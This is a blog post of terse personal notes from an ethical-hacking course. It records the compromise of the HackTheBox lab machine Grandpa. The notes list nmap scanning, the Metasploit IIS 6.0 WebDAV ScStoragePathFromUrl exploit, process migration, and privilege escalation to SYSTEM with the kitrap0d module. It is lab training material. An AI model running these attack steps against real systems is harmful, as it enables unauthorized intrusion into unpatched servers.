---
layout:     post
title:      TCM PEH Hacking Grandpa Notes
date:       2021-03-24
summary:    TheCyberMentor's Practical Ethical Hacking course mid-course capstone, hacking HackTheBox Grandpa
categories: certs
thumbnail: cogs
tags:
 - certs
 - pwned
---
<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="HTB_Grandpa_0"></a>HTB Grandpa</h2>
<p class="has-line-data" data-line-start="1" data-line-end="2">These are getting old</p>
<p class="has-line-data" data-line-start="3" data-line-end="13">nmap -A -T4 -p- 10.10.10.14<br>
Noted port 80 open<br>
Noted port 80 IIS 6.0<br>
Noted potentially risky methods (trace,put,propfind,search,lock,unlock,delete,move,mkcol)<br>
Noted Windows Server 2003 OS guess<br>
Googled IIS 6.0 exploit<br>
Found exploit-db WebDAV ScStoragePathFromUrl exploit remote buffer overflow<br>
Read through exploit, looks like it might work<br>
searchsploit ScStoragePathFromUrl<br>
Noted modules exist</p>
<hr>
<p class="has-line-data" data-line-start="14" data-line-end="36">msfconsole<br>
seach ScStoragePathFromUrl<br>
Noted results<br>
use 0<br>
options<br>
set rhosts tun0<br>
show targets<br>
exploit<br>
Noted no session created<br>
exploit<br>
Noted no session created<br>
set lport 5555<br>
exploit<br>
Noted no session created<br>
exploit<br>
Noted meterpreter shell (wtf)<br>
getuid<br>
Access denied<br>
sysinfo<br>
ps<br>
migrate 1788<br>
Noted migration successful, am now Network Service</p>
<hr>
<p class="has-line-data" data-line-start="37" data-line-end="44">background<br>
search suggester<br>
use 0<br>
options<br>
set session 1<br>
run<br>
Noted several exploits appears to be vulnerable</p>
<hr>
<p class="has-line-data" data-line-start="45" data-line-end="56">use exploit/windows/local/ms10_015_kitrap0d<br>
options<br>
set session 1<br>
exploit<br>
Noted failed, on wrong IP still because lhost option not yet present<br>
set lhost tun0<br>
exploit<br>
Noted meterpreter shell<br>
sysinfo<br>
getuid<br>
Noted am Authority System</p>